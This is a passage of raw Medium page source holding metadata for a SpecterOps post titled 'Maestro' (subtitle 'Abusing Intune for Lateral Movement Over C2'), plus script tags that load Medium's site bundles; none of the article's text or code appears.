agraph:45f5bfae1934_16"},{"__ref":"Paragraph:45f5bfae1934_17"},{"__ref":"Paragraph:45f5bfae1934_18"},{"__ref":"Paragraph:45f5bfae1934_19"},{"__ref":"Paragraph:45f5bfae1934_20"},{"__ref":"Paragraph:45f5bfae1934_21"},{"__ref":"Paragraph:45f5bfae1934_22"},{"__ref":"Paragraph:45f5bfae1934_23"},{"__ref":"Paragraph:45f5bfae1934_24"},{"__ref":"Paragraph:45f5bfae1934_25"},{"__ref":"Paragraph:45f5bfae1934_26"},{"__ref":"Paragraph:45f5bfae1934_27"},{"__ref":"Paragraph:45f5bfae1934_28"},{"__ref":"Paragraph:45f5bfae1934_29"},{"__ref":"Paragraph:45f5bfae1934_30"},{"__ref":"Paragraph:45f5bfae1934_31"},{"__ref":"Paragraph:45f5bfae1934_32"},{"__ref":"Paragraph:45f5bfae1934_33"},{"__ref":"Paragraph:45f5bfae1934_34"},{"__ref":"Paragraph:45f5bfae1934_35"},{"__ref":"Paragraph:45f5bfae1934_36"},{"__ref":"Paragraph:45f5bfae1934_37"},{"__ref":"Paragraph:45f5bfae1934_38"},{"__ref":"Paragraph:45f5bfae1934_39"},{"__ref":"Paragraph:45f5bfae1934_40"},{"__ref":"Paragraph:45f5bfae1934_41"},{"__ref":"Paragraph:45f5bfae1934_42"},{"__ref":"Paragraph:45f5bfae1934_43"},{"__ref":"Paragraph:45f5bfae1934_44"},{"__ref":"Paragraph:45f5bfae1934_45"},{"__ref":"Paragraph:45f5bfae1934_46"},{"__ref":"Paragraph:45f5bfae1934_47"},{"__ref":"Paragraph:45f5bfae1934_48"},{"__ref":"Paragraph:45f5bfae1934_49"},{"__ref":"Paragraph:45f5bfae1934_50"},{"__ref":"Paragraph:45f5bfae1934_51"},{"__ref":"Paragraph:45f5bfae1934_52"},{"__ref":"Paragraph:45f5bfae1934_53"},{"__ref":"Paragraph:45f5bfae1934_54"},{"__ref":"Paragraph:45f5bfae1934_55"},{"__ref":"Paragraph:45f5bfae1934_56"},{"__ref":"Paragraph:45f5bfae1934_57"},{"__ref":"Paragraph:45f5bfae1934_58"},{"__ref":"Paragraph:45f5bfae1934_59"},{"__ref":"Paragraph:45f5bfae1934_60"},{"__ref":"Paragraph:45f5bfae1934_61"},{"__ref":"Paragraph:45f5bfae1934_62"},{"__ref":"Paragraph:45f5bfae1934_63"},{"__ref":"Paragraph:45f5bfae1934_64"},{"__ref":"Paragraph:45f5bfae1934_65"},{"__ref":"Paragraph:45f5bfae1934_66"},{"__ref":"Paragraph:45f5bfae1934_67"},{"__ref":"Paragraph:45f5bfae1934_68"},{"__ref":"Paragraph:45f5bfae1934_69"},{"__ref":"Paragraph:45f5bfae1934_70"},{"__ref":"Paragraph:45f5bfae1934_71"},{"__ref":"Paragraph:45f5bfae1934_72"},{"__ref":"Paragraph:45f5bfae1934_73"},{"__ref":"Paragraph:45f5bfae1934_74"},{"__ref":"Paragraph:45f5bfae1934_75"},{"__ref":"Paragraph:45f5bfae1934_76"},{"__ref":"Paragraph:45f5bfae1934_77"},{"__ref":"Paragraph:45f5bfae1934_78"},{"__ref":"Paragraph:45f5bfae1934_79"},{"__ref":"Paragraph:45f5bfae1934_80"},{"__ref":"Paragraph:45f5bfae1934_81"},{"__ref":"Paragraph:45f5bfae1934_82"},{"__ref":"Paragraph:45f5bfae1934_83"},{"__ref":"Paragraph:45f5bfae1934_84"},{"__ref":"Paragraph:45f5bfae1934_85"},{"__ref":"Paragraph:45f5bfae1934_86"},{"__ref":"Paragraph:45f5bfae1934_87"},{"__ref":"Paragraph:45f5bfae1934_88"},{"__ref":"Paragraph:45f5bfae1934_89"},{"__ref":"Paragraph:45f5bfae1934_90"},{"__ref":"Paragraph:45f5bfae1934_91"},{"__ref":"Paragraph:45f5bfae1934_92"},{"__ref":"Paragraph:45f5bfae1934_93"},{"__ref":"Paragraph:45f5bfae1934_94"},{"__ref":"Paragraph:45f5bfae1934_95"},{"__ref":"Paragraph:45f5bfae1934_96"},{"__ref":"Paragraph:45f5bfae1934_97"},{"__ref":"Paragraph:45f5bfae1934_98"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:1cf7ed8b7054"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fposts.specterops.io\u002Fmaestro-9ed71d38d546","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"},{"__typename":"Topic","slug":"programming"}],"isPublished":true,"latestPublishedVersion":"45f5bfae1934","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":12,"allowResponses":true,"isLimitedState":false,"title":"Maestro","isSeries":false,"sequence":null,"uniqueSlug":"maestro-9ed71d38d546","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1730478733473,"readingTime":10.814150943396227,"previewContent":{"__typename":"PreviewContent","subtitle":"Abusing Intune for Lateral Movement Over C2"},"previewImage":{"__ref":"ImageMetadata:1*Q0HvFPk-PaFefT-lIZpQVw.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1730409894212,"updatedAt":1731566641315,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:9ed71d38d546-viewerId:lo_7f2bf6c42a29"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[],"isNewsletter":false,"statusForCollection":"APPROVED","pendingCollection":null,"detectedLanguage":"en","wordCount":2455,"layerCake":6,"responsesLocked":false}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.b2314f6d.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.24534aeb.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9120.5df29668.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.b0942613.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.5b3eb23a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.1ab63137.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6349.b071a958.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7079.67349d50.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3735.afb7e926.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.a2d9f6a1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.cd03f950.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.08de95de.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7346.72622eb9.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2420.2a5e2d95.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.ca7937c2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.d195c6f1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2106.21ff89d3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.3d049572.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2961.00a48598.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.c4082863.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.c8a11795.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.6565ad5f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.a0afad8a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.36c2ecf4.chunk.js"></script><script>window.main();</script></body></html>